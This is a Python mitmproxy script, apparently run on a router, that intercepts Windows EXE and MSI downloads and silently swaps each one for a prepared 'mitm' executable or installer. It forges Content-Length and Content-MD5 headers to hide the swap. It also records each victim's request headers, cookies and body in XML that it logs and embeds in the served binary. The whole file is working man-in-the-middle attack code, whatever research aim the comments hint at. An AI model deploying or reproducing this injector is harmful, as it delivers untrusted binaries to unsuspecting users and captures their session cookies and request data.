import os
import hashlib
import mitmproxy
from mitmproxy.models.http import HTTPResponse, Headers
import struct
import tempfile
import base64
import xml.etree.ElementTree as ET
from shutil import copyfile
import click
#import msilib
#from msilib import schema
import json
import logging

l = logging.getLogger("mitm")
l.setLevel(logging.DEBUG)
h = logging.FileHandler("/var/log/mitm_log.log", "w")
l.addHandler(h)

MSI_FILE = '/etc/router/mitm.msi'
EXE_FILE = '/etc/router/mitm.exe'
TAMPERED_FILES_LOG = '/var/log/mitm_tampered_files.log'

EXE_MIMES = ('application/dos-exe', 'application/x-msdos-program', 'application/exe', 'application/msdos-windows', 'application/x-sdlc', 'application/x-exe', 'application/x-winexe')
MSI_MIMES = ('application/x-msi', 'application/x-msdownload')

PLACEHOLDER = '{CICCIOBELLO!}'


def responseheaders(ctx, flow):
    try:
        injection_type = None
        tmpname = None

        old_headers = flow.response.headers.copy()

        # Decide if we need to hook or not.
        # The following are cases in which it is easy to spot EXE/MSI files being downloaded
        # 1. Attachment CONTENT-DISPOSITION with EXE/MSI
        if flow.request.headers.get("Content-Disposition") is not None:
            attachment = flow.request.headers.get("Content-Disposition")
            if attachment.lower().find(".exe") != -1:
                injection_type = "exe"
            elif attachment.lower().find(".msi") != -1:
                injection_type = "msi"

        # 2. URL ending with MSI/EXE
        elif flow.request.pretty_url.endswith(".exe"):
            injection_type = "exe"
        elif flow.request.pretty_url.endswith(".msi"):
            injection_type = "msi"
        elif flow.response.headers.get("Content-Type") is not None:
            if flow.response.headers.get("Content-Type").lower() in EXE_MIMES:
                injection_type = "exe"
            elif flow.response.headers.get("Content-Type").lower() in MSI_MIMES:
                injection_type = "msi"
        else:
            injection_type = "magic_number"

        """
        # Still, there are cases in which we are not 100% sure data is executable. For instance, octet-stream
        # might represent MSI/EXE. Thus, we apply a very simple strategy for intercepting any kind of binary data:
        # every time we see content-length > 1 Mb, we inspect the first bytes content, checking the magic number.
        if flow.response.headers.get("Content-Legnth") is not None:
            length = flow.response.headers.get("Content-Legnth")
            if int(length) > 1048576:
                injection_type = "magic_number"
        """

        # At this point we have determined the injeciton type we want to process. However, magic_number inspection
        # needs deferred decision, we we cannot really apply that injeciton over here. Just handle MSI and EXE.
        if injection_type == "magic_number":
            # Just defer the operation. By setting the following flag, the framework will collect the entire response
            # first and later serve it to the client
            flow.response.stream = False

        elif injection_type in ("msi", "exe"):
            # Prepare the file to be injected
            if injection_type == "exe":
                tmpname = prepare_mitm_exe(flow)

            elif injection_type == "msi":
                tmpname = prepare_mitm_msi(flow)

            # Calculate MD5
            m = hashlib.md5()
            with open(tmpname, 'rb') as f:
                data = f.read(4096)
                while len(data)>0:
                    m.update(data)
                    data = f.read(4096)

            # Keep track of tampered files so we can later on study successful cases
            _log_tampered_file(injection_type, m.hexdigest(), build_xml(flow))

            # Now we align response headers according to our injected file
            size = os.path.getsize(tmpname)
            flow.response.headers['Content-Length'] = str(size)
            flow.response.headers['Content-MD5'] = base64.encodestring(m.hexdigest()).strip()
            flow.response.headers['Accept-Ranges'] = "none"

            flow.response.stream = get_injector(tmpname, True)

            notify_injection(ctx, flow, injection_type, old_headers)

    except Exception as e:
        import traceback
        ctx.log(traceback.format_exc())
        l.exception("Error!")
        import pdb;pdb.set_trace()


def response(ctx, flow):
    try:
        #import pdb;pdb.set_trace()
        old_headers = flow.response.headers.copy()
        # This function will be invoked uniquely when the expected data is not an MSI nor an EXE, but the content
        # is large enough to be suspicious. So we will tamper the response directly here, after checking the magic number
        tmpname = None
        type=None
        magic_string = flow.response.get_decoded_content()
        if magic_string is not None:
            magic_string = magic_string[0:8]

            if magic_string.find("\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1") == 0:
                # This is an MSI file.
                tmpname = prepare_mitm_msi(flow)
                type="msi"
            elif magic_string.find("\x4d\x5a") == 0:
                # This is an EXE file.
                tmpname = prepare_mitm_exe(flow)
                type="exe"
            else:
                # This is probably some other stuff we cannot identify.
                pass

        if tmpname is not None:
            # Calculate MD5
            m = hashlib.md5()
            with open(tmpname, 'rb') as f:
                content = f.read()
                m.update(content)

            _log_tampered_file(type, m.hexdigest(), build_xml(flow))

            # Now we align response headers according to our injected file
            size = os.path.getsize(tmpname)
            flow.response.headers['Content-Length'] = str(size)
            flow.response.headers['Content-MD5'] = base64.encodestring(m.hexdigest()).strip()
            flow.response.headers['Accept-Ranges'] = "none"
            flow.response.headers['Content-Encoding'] = "none"

            flow.response.content = content

            notify_injection(ctx, flow, "magic_number", old_headers)
    except Exception as e:
        logging.exception("Error in response()")
        import pdb;pdb.set_trace()


def get_injector(fname, delete):
    def a_func(chunks):
        with open(fname, 'rb') as f:
            d = f.read(4096)
            while len(d) > 0:
                yield d
                d = f.read(4096)
        if delete:
            os.unlink(fname)

    return a_func


def build_xml(f):
    flow = ET.Element("Flow")

    # Request
    request = ET.SubElement(flow, "Request")
    ET.SubElement(request, "FirstLineFormat").text = f.request.first_line_format
    ET.SubElement(request, "Method").text = f.request.method
    ET.SubElement(request, "Scheme").text = f.request.scheme
    ET.SubElement(request, "Host").text = f.request.host
    ET.SubElement(request, "PrettyHost").text = f.request.pretty_host
    ET.SubElement(request, "Port").text = str(f.request.port)
    ET.SubElement(request, "Path").text = f.request.path
    ET.SubElement(request, "PrettyUrl").text = f.request.pretty_url
    ET.SubElement(request, "Url").text = f.request.url
    ET.SubElement(request, "HttpVersion").text = f.request.http_version

    query = ET.SubElement(request, "Query")
    if f.request.query is not None:
        for q in f.request.query:
            query = ET.SubElement(query, "Param")
            ET.SubElement(query, "Name").text = str(q[0])
            ET.SubElement(query, "Value").text = str(q[1])


    headers = ET.SubElement(request, "Headers")
    for key, value in f.request.headers.iteritems():
        header = ET.SubElement(headers, "Header")
        ET.SubElement(header, "Key").text = key
        ET.SubElement(header, "Value").text = value

    cookies = ET.SubElement(request, "Cookies")
    for i in f.request.cookies:
        cookie = ET.SubElement(cookies, "Cookie")
        ET.SubElement(cookie, "Name").text = str(i[0])
        # Value = contains a list of val, options[]
        ET.SubElement(cookie, "Value").text = str(i[1])

    ET.SubElement(request, "Content").text = base64.encodestring(f.request.content)

    # Response
    response = ET.SubElement(flow, "Response")

    ET.SubElement(response, "StatusCode").text = str(f.response.status_code)

    headers = ET.SubElement(response, "Headers")
    for key, value in f.response.headers.iteritems():
        header = ET.SubElement(headers, "Header")
        ET.SubElement(header, "Key").text = key
        ET.SubElement(header, "Value").text = value

    cookies = ET.SubElement(response, "Cookies")
    for i in f.response.cookies:
        cookie = ET.SubElement(cookies, "Cookie")
        ET.SubElement(cookie, "Name").text = str(i[0])
        # Value = contains a list of val, options[]
        ET.SubElement(cookie, "Value").text = str(i[1])

    # No need to log the content, because at this time the response will contain our tampered exe.
    return ET.tostring(flow, encoding="utf-8")


def prepare_mitm_exe(flow):
    # Copy the mitm attack, adding custom logging info.
    ff = tempfile.NamedTemporaryFile(delete=False)
    tmpname = ff.name
    ff.close()

    copyfile(EXE_FILE, ff.name)

    with open(tmpname, 'ab') as f:
        count = 0

        xml_text = build_xml(flow)

        # Count the number of chars
        count += len(xml_text)
        f.write(xml_text)

        # Now write the 4 bytes len
        data = struct.pack("I", count)
        f.write(data)
        f.flush()
    return tmpname


def prepare_mitm_msi(flow):
    # Create a custom version of the MTIM MSI file containing extra data regarding the attack.
    with open(MSI_FILE, 'rb') as msi:
        s = msi.read()
        index = s.find(PLACEHOLDER)
        if index == -1:
            raise Exception("Invalid MTIM MSI file. Could not find PLACEHOLDER %s" % PLACEHOLDER)
        with tempfile.NamedTemporaryFile(delete=False, mode='wb') as ff:
            # Write the head of the file until we hit index
            written = 0
            ff.write(s[:index])
            written += index

            # At this point we are aligned to index, so we write our text
            xml_text = build_xml(flow)
            ff.write(xml_text)
            written += len(xml_text)

            # Now write the rest of the contents
            ff.write(s[written:])
            written += len(s[written:])

            ff.flush()

            # We are now done.
            return ff.name


def notify_injection(ctx, flow, type, old_headers):
    ctx.log("\n\n=================== INJECTION ===================")
    ctx.log("Response headers before mofification:\n%s\n" % old_headers)
    ctx.log("New Response Headers:\n%s" % flow.response.headers)

    color = "white"
    if type == "exe":
        color = "red"
    elif type == "msi":
        color = "blue"
    elif type == "magic_number":
        color = "magenta"

    sep = 'x'*click.get_terminal_size()[0]
    text = 'INJECTION PERFORMED'
    pad = ((click.get_terminal_size()[0] - len(text)) / 2) * " "
    click.secho(sep, bg=color, fg='white')
    click.secho("%s%s%s" % (pad, text, pad), fg="white", bg=color, blink=True, bold=True)
    click.secho(sep, bg=color, fg='white')


def _log_tampered_file(type, hash, context):
    # No warries of messing with the file as long as we run this in single-threaded mode.
    with open(TAMPERED_FILES_LOG, mode='a') as f:
        f.write("%s;%s;%s\n" % (type, hash, context))